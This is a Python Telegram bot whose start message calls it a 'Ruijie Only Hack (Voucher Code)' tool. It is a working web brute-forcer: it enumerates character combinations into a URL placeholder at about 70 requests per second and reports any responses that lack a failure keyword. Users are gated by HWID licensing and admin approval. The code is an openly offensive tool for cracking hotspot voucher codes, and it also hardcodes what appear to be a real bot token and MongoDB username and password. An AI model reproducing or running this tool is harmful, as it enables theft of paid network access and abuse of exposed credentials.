# -*- coding: utf-8 -*-
import os
import re
import math
import time
import string
import random
import asyncio
from typing import Callable, Dict, Any, Awaitable
from aiogram import Bot, Dispatcher, types, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from motor.motor_asyncio import AsyncIOMotorClient

# Render Server အတွက် web module အား Import လုပ်ခြင်း
import aiohttp
from aiohttp import web

class RateLimiter:
    def __init__(self, rate_limit_per_second: float):
        self.rate_limit_per_second = rate_limit_per_second
        self.tokens = rate_limit_per_second
        self.last_check = time.time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        sleep_time = 0
        async with self.lock:
            now = time.time()
            elapsed = now - self.last_check
            self.last_check = now
            self.tokens = min(self.rate_limit_per_second, self.tokens + elapsed * self.rate_limit_per_second)

            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.rate_limit_per_second
                self.tokens = 0
            else:
                self.tokens -= 1
        
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)

# --- Configuration ---
BOT_TOKEN = "8796960995:AAEZ7iQ_kb8HY0iMkTf-fgGOb5GGJI8gLPw"
BOT_ID = "bot1" 
ADMIN_ID = 7695807003  # သင်၏ Telegram ID အား အလိုအလျောက် Approved ပေးရန်

# 🔒 SQLite အစား သင်၏ စိတ်ချရသော MongoDB Cloud Connection ကို ပြောင်းလဲအသုံးပြုခြင်း
MONGO_URI = "mongodb+srv://hhtethtet277_db_user:VpcG7AtKY401kmO1@cluster0.vhj7ntv.mongodb.net/?appName=Cluster0"

# --- MongoDB Setup ---
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client["say_shi_lar_db"]
users_collection = db["users"]

async def init_db():
    # Database စတင်ပွင့်မပွင့် စမ်းသပ်ခြင်း
    try:
        await mongo_client.admin.command('ping')
        print("✨ MongoDB Cloud Connected Successfully for Say Shi Lar Project!")
    except Exception as e:
        print(f"❌ MongoDB Connection Error: {e}")

async def update_user(tg_id: int, updates: dict):
    await users_collection.update_one(
        {"tg_id": tg_id, "bot_id": BOT_ID},
        {"$set": updates},
        upsert=True
    )

async def get_user_from_db(tg_id: int):
    return await users_collection.find_one({"tg_id": tg_id, "bot_id": BOT_ID})

# --- Globals for Runtime States ---
active_tasks = {}
stop_events = {}
resume_states = {}
task_stats = {}

def init_user_state(tg_id: int):
    if tg_id not in resume_states:
        resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    if tg_id not in task_stats:
        task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}

# --- Middleware ---
class AuthMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[types.Message, Dict[str, Any]], Awaitable[Any]],
        event: types.Message,
        data: Dict[str, Any]
    ) -> Any:
        if not event.from_user:
            return await handler(event, data)
            
        tg_id = event.from_user.id
        init_user_state(tg_id)
        
        user = await get_user_from_db(tg_id)
        if not user:
            is_approved = 1 if tg_id == ADMIN_ID else 0
            await update_user(tg_id, {
                "tg_username": event.from_user.username or "Unknown",
                "hwid": "None",
                "is_approved": is_approved,
                "is_running": 0
            })
            user = await get_user_from_db(tg_id)

        command = event.text.split()[0] if event.text else ""
        if command in ["/start", "/key", "/status", "/help"]:
            return await handler(event, data)

        if not user.get("is_approved", 0):
            return await event.answer("❌ **သင့်တွင် ခွင့်ပြုချက်မရှိပါ။**\n\nကျေးဇူးပြု၍ `/key` ဟုရိုက်နှိပ်၍ HWID Register ပြုလုပ်ပါ။")
            
        return await handler(event, data)

# --- Bot Initialization ---
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
dp.message.middleware(AuthMiddleware())

# --- Brute Force Logic ---
def get_char_set(mode: str) -> str:
    if mode == "1": return string.digits
    if mode == "2": return string.ascii_lowercase
    if mode == "3": return string.ascii_uppercase
    if mode == "4": return string.ascii_letters
    if mode == "5": return string.ascii_letters + string.digits
    return string.digits

def index_to_string(idx: int, length: int, charset: str) -> str:
    base = len(charset)
    res = []
    for _ in range(length):
        res.append(charset[idx % base])
        idx //= base
    return "".join(reversed(res))

async def brute_force_task(tg_id: int, url: str, error_keyword: str, mode: str, length: int, start_idx: int, target_success: int):
    charset = get_char_set(mode)
    total_combinations = len(charset) ** length
    limiter = RateLimiter(70.0)
    
    task_stats[tg_id]["status"] = "Running"
    task_stats[tg_id]["target_success"] = target_success
    start_time = time.time()
    last_ui_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        for idx in range(start_idx, total_combinations):
            if stop_events[tg_id].is_set():
                task_stats[tg_id]["status"] = "Stopped"
                await update_user(tg_id, {"is_running": 0})
                break
                
            payload_str = index_to_string(idx, length, charset)
            target_url = url.replace("$", payload_str)
            
            await limiter.acquire()
            try:
                async with session.get(target_url, timeout=5) as response:
                    res_text = await response.text()
                    task_stats[tg_id]["attempts"] += 1
                    
                    if error_keyword not in res_text:
                        task_stats[tg_id]["found"] += 1
                        task_stats[tg_id]["success_count"] += 1
                        try:
                            await bot.send_message(tg_id, f"🎉 **FOUND MATCHING KEY!**\n\n📌 **URL:** {target_url}\n🔑 **Payload:** `{payload_str}`")
                        except Exception: pass
                        
                        if task_stats[tg_id]["success_count"] >= target_success:
                            task_stats[tg_id]["status"] = "Completed"
                            await bot.send_message(tg_id, "✅ **သတ်မှတ်ထားသော Target Success အရေအတွက် ပြည့်မြောက်သဖြင့် Task အား အောင်မြင်စွာ အဆုံးသတ်လိုက်ပါပြီ။**")
                            await update_user(tg_id, {"is_running": 0})
                            resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
                            break
            except Exception:
                task_stats[tg_id]["attempts"] += 1
                
            resume_states[tg_id]["current_idx"] = idx + 1
            
            now = time.time()
            if now - last_ui_time >= 5.0:
                elapsed = now - start_time
                task_stats[tg_id]["speed"] = round(task_stats[tg_id]["attempts"] / elapsed, 2) if elapsed > 0 else 0
                last_ui_time = now
                
        else:
            task_stats[tg_id]["status"] = "Completed"
            await update_user(tg_id, {"is_running": 0})
            await bot.send_message(tg_id, "🏁 **ခန့်မှန်းခြေ ပေါင်းစပ်မှု အားလုံးကို ရှာဖွေပြီးစီးသွားပါပြီ။**")
            resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}

# --- Handlers ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = (
        "မင်္ဂလာပါ TxiJuNaing Developer မှ ဖန်တီးထားသော **Ruijie Only Hack (Voucher Code)** Project Bot မှ ကြိုဆိုပါသည်! 🇲🇲\n\n"
        "စွမ်းအားမြင့် Web-Brute-Forcing စနစ်ကို ဤနေရာတွင် အသုံးပြုနိုင်ပါသည်။\n\n"
        "💡 **အခြေခံ Command များ:**\n"
        "📌 `/key` - သင့်၏ HWID လိုင်စင်စာရင်းသွင်းရန်\n"
        "📌 `/brute` - Brute Force Task အသစ်စတင်ရန်\n"
        "📌 `/status` - လက်ရှိ Task အခြေအနေအား ကြည့်ရှုရန်\n"
        "📌 `/stop` - Task အား ခေတ္တရပ်တန့်ရန်\n"
        "📌 `/refresh` - Bot ၏ Task များအားလုံးကို Clean လုပ်ရန်"
    )
    await message.answer(welcome_text, parse_mode="Markdown")

@dp.message(Command("key"))
async def cmd_key(message: types.Message):
    tg_id = message.from_user.id
    user = await get_user_from_db(tg_id)
    
    if user and user.get("is_approved", 0):
        return await message.answer("✅ **သင့်အကောင့်သည် အတည်ပြုပြီးသား ဖြစ်ပါသည်။**\n`/brute` ကိုသုံး၍ စတင်နိုင်ပါပြီ။")
        
    await message.answer(
        f"🔑 **Say Shi Lar HWID Registration**\n\nသင့်၏ HWID Key ကို အောက်ပါခလုတ်ကိုနှိပ်၍ ထည့်သွင်းပေးပါရန်။",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="HWID ထည့်သွင်းရန် 🔑", web_app=types.WebAppInfo(url="https://hhtethtet277-svg.github.io/moeyu/"))]
        ])
    )

@dp.message(lambda m: m.web_app_data is not None)
async def web_app_data_receiver(message: types.Message):
    tg_id = message.from_user.id
    hwid = message.web_app_data.data
    
    await update_user(tg_id, {"hwid": hwid, "is_approved": 0})
    await message.answer(f"✅ **HWID လက်ခံရရှိပါပြီ!**\n\n🔑 `HWID: {hwid}`\n\nအက်ဒမင်မှ သင့်အား စိစစ်ပြီး လိုင်စင်ခွင့်ပြုပေးသည်အထိ ခေတ္တစောင့်ဆိုင်းပေးပါရန်။")

@dp.message(Command("brute"))
async def cmd_brute(message: types.Message):
    tg_id = message.from_user.id
    user = await get_user_from_db(tg_id)
    
    if user.get("is_running", 0):
        return await message.answer("❌ **လက်ရှိတွင် အခြား Task တစ်ခု Run နေပါသည်။**\nရပ်တန့်လိုပါက `/stop` ကိုသုံးပါ။")
        
    args = message.text.split(maxsplit=5)
    if len(args) < 6:
        example = (
            "ℹ️ **အသုံးပြုပုံ ပုံစံစနစ်:**\n"
            "`/brute [URL] [Error_Keyword] [Char_Mode] [Length] [Target_Success]`\n\n"
            "⚠️ **သတိပြုရန်:** URL ထဲရှိ ပြောင်းလဲစမ်းသပ်မည့်နေရာတွင် `$` သင်္ကေတကို ထည့်ပေးရပါမည်။\n\n"
            "📖 **Char_Mode ရွေးချယ်မှုများ:**\n"
            "`1` - ဂဏန်းသီးသန့် (0-9)\n"
            "`2` - အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
            "`3` - အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
            "`4` - စာလုံးအကြီးအသေးစုံ (a-zA-Z)\n"
            "`5` - စာလုံးနှင့်ဂဏန်းစုံ (a-zA-Z0-9)\n\n"
            "💡 **ဥပမာ စာသား:**\n"
            "`/brute https://example.com/api?key=$ \"Invalid key\" 1 4 1`"
        )
        return await message.answer(example, parse_mode="Markdown")
        
    url, error_kw, mode, length_str, target_succ_str = args[1], args[2], args[3], args[4], args[5]
    
    if "$" not in url:
        return await message.answer("❌ URL တွင် နေရာအစားထိုးမည့် `$` သင်္ကေတ ပါဝင်ရပါမည်။")
        
    try:
        length = int(length_str)
        target_success = int(target_succ_str)
    except ValueError:
        return await message.answer("❌ Length နှင့် Target Success သည် ဂဏန်းများသာ ဖြစ်ရပါမည်။")
        
    error_kw = error_kw.strip('"')
    
    stop_events[tg_id] = asyncio.Event()
    resume_states[tg_id] = {"mode": mode, "length": length, "start_offset": 0, "current_idx": 0, "target_success": target_success}
    task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": target_success, "status": "Starting", "speed": 0}
    
    await update_user(tg_id, {"is_running": 1})
    await message.answer("🚀 **Say Shi Lar Engine စတင်ပါပြီ...**\nအခြေအနေကို စစ်ဆေးရန် `/status` ဟု ရိုက်နှိပ်နိုင်ပါသည်။")
    
    task = asyncio.create_task(brute_force_task(tg_id, url, error_kw, mode, length, 0, target_success))
    active_tasks[tg_id] = task

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    tg_id = message.from_user.id
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle":
        return await message.answer("❌ **လက်ရှိတွင် မည်သည့် Task မှ အလုပ်လုပ်မနေပါ။**")
        
    st = task_stats[tg_id]
    rs = resume_states[tg_id]
    charset = get_char_set(rs["mode"])
    total = len(charset) ** rs["length"] if rs["length"] else 0
    current_progress = rs["current_idx"]
    
    status_text = (
        "📊 **Say Shi Lar Engine Status**\n\n"
        f"⚙️ **အခြေအနေ:** `{st['status']}`\n"
        f"🔄 **စမ်းသပ်ပြီးမှု:** `{st['attempts']:,} / {total:,}`\n"
        f"🎯 **အောင်မြင်မှု (Found):** `{st['found']:,} / {st['target_success']}`\n"
        f"⚡ **အမြန်နှုန်း:** `{st['speed']} req/s`\n"
        f"📍 **လက်ရှိညွှန်းကိန်း (Index):** `{current_progress:,}`"
    )
    await message.answer(status_text, parse_mode="Markdown")

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    tg_id = message.from_user.id
    if tg_id in stop_events:
        stop_events[tg_id].set()
        
    await update_user(tg_id, {"is_running": 0})
    if tg_id in active_tasks:
        active_tasks[tg_id].cancel()
        del active_tasks[tg_id]
        
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle": 
        return await message.answer("❌ အလုပ်လုပ်နေသော Task မရှိပါ။ (သို့သော် Lock ကိုမူ ရှင်းလင်းပေးလိုက်ပါပြီ)")
        
    task_stats[tg_id]["status"] = "Stopped"
    await message.answer("✅ ရောက်နေသောနေရာတွင် ရပ်တန့်လိုက်ပါပြီ။\n`/brute` ပြန်ရိုက်ပါက ဆက်လက်လုပ်ဆောင်နိုင်ပါသည်။")

@dp.message(Command("refresh"))
async def cmd_refresh(message: types.Message):
    tg_id = message.from_user.id
    
    if tg_id in stop_events: stop_events[tg_id].set()
    await update_user(tg_id, {"is_running": 0})
    
    if tg_id in active_tasks:
        active_tasks[tg_id].cancel()
        del active_tasks[tg_id]
        
    init_user_state(tg_id)
    resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    
    await message.answer("🔄 **Refresh အောင်မြင်ပါသည်!**\n\nသင့်၏ လက်ရှိ Task များနှင့် မှတ်ဉာဏ်များကို သန့်စင်ပေးလိုက်ပါပြီ။")

# --- Dummy Web Server for Render Health Check ---
async def handle_render_health(request):
    return web.Response(text="Bot is running perfectly on Render Server with MongoDB Atlas!")

async def main():
    await init_db()
    
    # Render Web Service အလုပ်လုပ်နိုင်ရန် Port Bind သတ်မှတ်ခြင်း
    app = web.Application()
    app.router.add_get("/", handle_render_health)
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Port bound to {port} for Render Web Service")
    
    print("🤖 Bot polling starting...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
